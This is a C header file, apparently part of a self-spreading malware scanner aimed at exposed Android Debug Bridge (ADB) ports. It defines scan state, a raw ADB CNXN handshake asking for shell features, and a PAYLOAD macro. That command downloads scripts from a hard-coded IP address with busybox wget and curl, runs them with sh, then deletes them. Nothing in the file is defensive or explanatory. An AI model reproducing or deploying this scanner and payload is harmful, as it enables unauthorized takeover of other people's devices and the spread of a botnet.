
#pragma once

enum
{
	MAX_FDS = 128,
	MAX_RAW_PPS = 80,
	SCAN_TIMEOUT = 45,
	SCAN_CLOSED = 0,
    SCAN_CONNECTING = 1,
    SCAN_OPEN = 2
};

struct scan
{
	int fd;
	uint32_t addr;
	uint16_t port;
	uint8_t state;
	uint32_t timeout;
	char buf[1024];
};

#define CNXN "CNXN\x00\x00\x00\x01\x00\x00\x04\x00\x1b\x00\x00\x00\x4d\x0a\x00\x00\xbc\xb1\xa7\xb1\x68\x6f\x73\x74\x3a\x3a\x66\x65\x61\x74\x75\x72\x65\x73\x3d\x63\x6d\x64\x2c\x73\x68\x65\x6c\x6c\x5f\x76\x32"
#define CNXN_SIZE 51

#define PAYLOAD "cd /data/local/tmp; busybox wget http://37.49.224.234/wget -O -> wwww; sh wwww; curl -O http://37.49.224.234/curl; sh curl; rm wwww curl"

void init_scan(void);
void terminate_scan(void);

